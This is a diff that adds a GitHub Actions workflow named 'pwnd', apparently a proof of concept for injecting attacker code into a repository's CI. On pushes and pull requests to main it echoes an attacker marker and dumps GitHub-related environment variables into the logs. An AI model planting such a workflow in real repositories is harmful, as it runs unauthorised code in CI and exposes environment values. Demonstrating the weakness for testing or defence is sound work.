@@ -1,0 +1,11 @@
+name: pwnd
+on:
+  push:
+    branches: [main]
+  pull_request:
+    branches: [main]
+jobs:
+  pwn:
+    runs-on: ubuntu-latest
+    steps:
+      - run: echo attacker-code-running-on-main && env | grep -i github || true
